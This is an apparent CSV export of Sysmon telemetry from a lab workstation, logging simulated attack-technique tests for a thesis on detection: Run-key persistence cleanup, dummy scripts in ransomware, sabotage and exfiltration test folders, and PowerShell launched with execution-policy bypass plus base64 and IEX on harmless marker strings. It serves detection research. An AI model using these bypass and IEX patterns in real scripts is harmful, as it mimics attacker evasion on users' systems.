_ts,ID,Timestamp,EventData,ClientId
1783860510744,1,2026-07-12T12:46:27.9945143Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:46:16.875"",
 ""ProcessGuid"": ""{6bc49a7d-8c98-6a53-6c05-000000009a01}"",
 ""ProcessId"": 10200,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c reg.exe delete \""HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"" /v \""TFM_T1547_001_test\"" /f"",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:46:28.0249892Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:46:16.888"",
 ""ProcessGuid"": ""{6bc49a7d-8c98-6a53-6d05-000000009a01}"",
 ""ProcessId"": 2544,
 ""Image"": ""C:\\Windows\\System32\\reg.exe"",
 ""FileVersion"": ""10.0.19041.1 (WinBuild.160101.0800)"",
 ""Description"": ""Registry Console Tool"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""reg.exe"",
 ""CommandLine"": ""reg.exe  delete \""HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"" /v \""TFM_T1547_001_test\"" /f"",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=227F63E1D9008B36BDBCC4B397780BE4,SHA256=C0E25B1F9B22DE445298C1E96DDFCEAD265CA030FA6626F61A4A4786CC4A3B7D,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC"",
 ""ParentProcessGuid"": ""{6bc49a7d-8c98-6a53-6c05-000000009a01}"",
 ""ParentProcessId"": ""10200"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c reg.exe delete \""HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"" /v \""TFM_T1547_001_test\"" /f"",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:46:28.1071805Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:46:16.937"",
 ""ProcessGuid"": ""{6bc49a7d-8c98-6a53-6e05-000000009a01}"",
 ""ProcessId"": 3896,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\crear_directorio_dummy.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:46:28.1388375Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:46:16.949"",
 ""ProcessGuid"": ""{6bc49a7d-8c98-6a53-6f05-000000009a01}"",
 ""ProcessId"": 12052,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""FileVersion"": ""10.0.19041.3393 (WinBuild.160101.0800)"",
 ""Description"": ""Windows PowerShell"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""PowerShell.EXE"",
 ""CommandLine"": ""powershell.exe  -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\crear_directorio_dummy.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=DFD66604CA0898E8E26DF7B1635B6326,SHA256=D23B67799A0DA0143E395BA5DB906A22AB08FAC4BD5581E275B1E0F1B3FAC55C,IMPHASH=88CB9A420410BDA787E305B65518A934"",
 ""ParentProcessGuid"": ""{6bc49a7d-8c98-6a53-6e05-000000009a01}"",
 ""ParentProcessId"": ""3896"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\crear_directorio_dummy.ps1\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,11,2026-07-12T12:46:28.2850396Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:46:17.033"",
 ""ProcessGuid"": ""{6bc49a7d-8c98-6a53-6f05-000000009a01}"",
 ""ProcessId"": 12052,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""TargetFilename"": ""C:\\Users\\seguridad\\AppData\\Local\\Temp\\__PSScriptPolicyTest_lqsqazup.u45.ps1"",
 ""CreationUtcTime"": ""2026-07-12 12:46:17.033"",
 ""User"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:46:43.2490318Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:46:25.763"",
 ""ProcessGuid"": ""{6bc49a7d-8ca1-6a53-7105-000000009a01}"",
 ""ProcessId"": 12020,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-008_Sabotaje\\crear_directorio_dummy.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:46:43.301643Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:46:25.788"",
 ""ProcessGuid"": ""{6bc49a7d-8ca1-6a53-7205-000000009a01}"",
 ""ProcessId"": 9672,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""FileVersion"": ""10.0.19041.3393 (WinBuild.160101.0800)"",
 ""Description"": ""Windows PowerShell"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""PowerShell.EXE"",
 ""CommandLine"": ""powershell.exe  -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-008_Sabotaje\\crear_directorio_dummy.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=DFD66604CA0898E8E26DF7B1635B6326,SHA256=D23B67799A0DA0143E395BA5DB906A22AB08FAC4BD5581E275B1E0F1B3FAC55C,IMPHASH=88CB9A420410BDA787E305B65518A934"",
 ""ParentProcessGuid"": ""{6bc49a7d-8ca1-6a53-7105-000000009a01}"",
 ""ParentProcessId"": ""12020"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-008_Sabotaje\\crear_directorio_dummy.ps1\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,11,2026-07-12T12:46:43.5410875Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:46:25.937"",
 ""ProcessGuid"": ""{6bc49a7d-8ca1-6a53-7205-000000009a01}"",
 ""ProcessId"": 9672,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""TargetFilename"": ""C:\\Users\\seguridad\\AppData\\Local\\Temp\\__PSScriptPolicyTest_xvt4lbtj.suz.ps1"",
 ""CreationUtcTime"": ""2026-07-12 12:46:25.937"",
 ""User"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:46:57.8513086Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:46:35.661"",
 ""ProcessGuid"": ""{6bc49a7d-8cab-6a53-7305-000000009a01}"",
 ""ProcessId"": 11536,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\crear_directorio_dummy.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:46:57.9523094Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:46:35.702"",
 ""ProcessGuid"": ""{6bc49a7d-8cab-6a53-7405-000000009a01}"",
 ""ProcessId"": 6976,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""FileVersion"": ""10.0.19041.3393 (WinBuild.160101.0800)"",
 ""Description"": ""Windows PowerShell"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""PowerShell.EXE"",
 ""CommandLine"": ""powershell.exe  -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\crear_directorio_dummy.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=DFD66604CA0898E8E26DF7B1635B6326,SHA256=D23B67799A0DA0143E395BA5DB906A22AB08FAC4BD5581E275B1E0F1B3FAC55C,IMPHASH=88CB9A420410BDA787E305B65518A934"",
 ""ParentProcessGuid"": ""{6bc49a7d-8cab-6a53-7305-000000009a01}"",
 ""ParentProcessId"": ""11536"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\crear_directorio_dummy.ps1\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,11,2026-07-12T12:46:58.3447916Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:46:36.012"",
 ""ProcessGuid"": ""{6bc49a7d-8cab-6a53-7405-000000009a01}"",
 ""ProcessId"": 6976,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""TargetFilename"": ""C:\\Users\\seguridad\\AppData\\Local\\Temp\\__PSScriptPolicyTest_4e0g4epi.m14.ps1"",
 ""CreationUtcTime"": ""2026-07-12 12:46:36.012"",
 ""User"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,3,2026-07-12T12:47:08.4954813Z,"{
 ""RuleName"": ""Usermode"",
 ""UtcTime"": ""2026-07-12 12:47:20.562"",
 ""ProcessGuid"": ""{6bc49a7d-7cd5-6a53-7102-000000009a01}"",
 ""ProcessId"": 5276,
 ""Image"": ""C:\\Users\\seguridad\\Desktop\\TFM\\Velociraptor\\velociraptor-v0.75.6-windows-amd64.exe"",
 ""User"": ""LT29\\seguridad"",
 ""Protocol"": ""tcp"",
 ""Initiated"": ""false"",
 ""SourceIsIpv6"": ""true"",
 ""SourceIp"": ""0:0:0:0:0:0:0:1"",
 ""SourceHostname"": ""LT29.ait.us.es"",
 ""SourcePort"": ""50633"",
 ""SourcePortName"": ""-"",
 ""DestinationIsIpv6"": ""true"",
 ""DestinationIp"": ""0:0:0:0:0:0:0:1"",
 ""DestinationHostname"": ""LT29.ait.us.es"",
 ""DestinationPort"": ""8443"",
 ""DestinationPortName"": ""-""
}",C.364907172793f8c7
1783860510744,3,2026-07-12T12:47:08.7803876Z,"{
 ""RuleName"": ""Usermode"",
 ""UtcTime"": ""2026-07-12 12:47:20.768"",
 ""ProcessGuid"": ""{6bc49a7d-7cd5-6a53-7102-000000009a01}"",
 ""ProcessId"": 5276,
 ""Image"": ""C:\\Users\\seguridad\\Desktop\\TFM\\Velociraptor\\velociraptor-v0.75.6-windows-amd64.exe"",
 ""User"": ""LT29\\seguridad"",
 ""Protocol"": ""tcp"",
 ""Initiated"": ""false"",
 ""SourceIsIpv6"": ""true"",
 ""SourceIp"": ""0:0:0:0:0:0:0:1"",
 ""SourceHostname"": ""LT29.ait.us.es"",
 ""SourcePort"": ""50634"",
 ""SourcePortName"": ""-"",
 ""DestinationIsIpv6"": ""true"",
 ""DestinationIp"": ""0:0:0:0:0:0:0:1"",
 ""DestinationHostname"": ""LT29.ait.us.es"",
 ""DestinationPort"": ""8443"",
 ""DestinationPortName"": ""-""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:47:14.2122709Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:46:48.364"",
 ""ProcessGuid"": ""{6bc49a7d-8cb8-6a53-7505-000000009a01}"",
 ""ProcessId"": 9804,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \""Write-Host TEC001_OK; Start-Sleep 3\"""",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:47:14.3140842Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:46:48.407"",
 ""ProcessGuid"": ""{6bc49a7d-8cb8-6a53-7605-000000009a01}"",
 ""ProcessId"": 11828,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""FileVersion"": ""10.0.19041.3393 (WinBuild.160101.0800)"",
 ""Description"": ""Windows PowerShell"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""PowerShell.EXE"",
 ""CommandLine"": ""powershell.exe  -NoProfile -ExecutionPolicy Bypass -Command \""Write-Host TEC001_OK; Start-Sleep 3\"""",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=DFD66604CA0898E8E26DF7B1635B6326,SHA256=D23B67799A0DA0143E395BA5DB906A22AB08FAC4BD5581E275B1E0F1B3FAC55C,IMPHASH=88CB9A420410BDA787E305B65518A934"",
 ""ParentProcessGuid"": ""{6bc49a7d-8cb8-6a53-7505-000000009a01}"",
 ""ParentProcessId"": ""9804"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \""Write-Host TEC001_OK; Start-Sleep 3\"""",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,11,2026-07-12T12:47:14.828847Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:46:48.899"",
 ""ProcessGuid"": ""{6bc49a7d-8cb8-6a53-7605-000000009a01}"",
 ""ProcessId"": 11828,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""TargetFilename"": ""C:\\Users\\seguridad\\AppData\\Local\\Temp\\__PSScriptPolicyTest_uuel3hk1.2xz.ps1"",
 ""CreationUtcTime"": ""2026-07-12 12:46:48.899"",
 ""User"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:47:18.5897163Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:46:52.234"",
 ""ProcessGuid"": ""{6bc49a7d-8cbc-6a53-7705-000000009a01}"",
 ""ProcessId"": 9912,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \""$b=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('TEC001_BASE64_OK')); [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)) | Write-Host; IEX 'Write-Host TEC001_IEX_OK'; Start-Sleep 2\"""",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:47:20.6617678Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:46:52.260"",
 ""ProcessGuid"": ""{6bc49a7d-8cbc-6a53-7805-000000009a01}"",
 ""ProcessId"": 2276,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""FileVersion"": ""10.0.19041.3393 (WinBuild.160101.0800)"",
 ""Description"": ""Windows PowerShell"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""PowerShell.EXE"",
 ""CommandLine"": ""powershell.exe  -NoProfile -ExecutionPolicy Bypass -Command \""$b=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('TEC001_BASE64_OK')); [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)) | Write-Host; IEX 'Write-Host TEC001_IEX_OK'; Start-Sleep 2\"""",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=DFD66604CA0898E8E26DF7B1635B6326,SHA256=D23B67799A0DA0143E395BA5DB906A22AB08FAC4BD5581E275B1E0F1B3FAC55C,IMPHASH=88CB9A420410BDA787E305B65518A934"",
 ""ParentProcessGuid"": ""{6bc49a7d-8cbc-6a53-7705-000000009a01}"",
 ""ParentProcessId"": ""9912"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \""$b=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('TEC001_BASE64_OK')); [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)) | Write-Host; IEX 'Write-Host TEC001_IEX_OK'; Start-Sleep 2\"""",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,11,2026-07-12T12:47:20.8285308Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:46:54.215"",
 ""ProcessGuid"": ""{6bc49a7d-8cbc-6a53-7805-000000009a01}"",
 ""ProcessId"": 2276,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""TargetFilename"": ""C:\\Users\\seguridad\\AppData\\Local\\Temp\\__PSScriptPolicyTest_r01vrius.evm.ps1"",
 ""CreationUtcTime"": ""2026-07-12 12:46:54.215"",
 ""User"": ""LT29\\seguridad""
}",C.364907172793f8c7
